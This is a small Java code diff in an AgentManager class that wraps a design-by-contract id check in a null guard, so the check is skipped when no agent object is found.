@@ -82,7 +82,9 @@ public final class AgentManager extends Manager implements Singleton {
         //#endif
         final Agent agent = statusObj.getAgent(id);
         //#ifdef DBC
-        Check.ensures(agent.agentId == id, "Wrong id");
+        if(agent!=null){
+            Check.ensures(agent.agentId == id, "Wrong id");
+        }
         //#endif
 
         return agent;
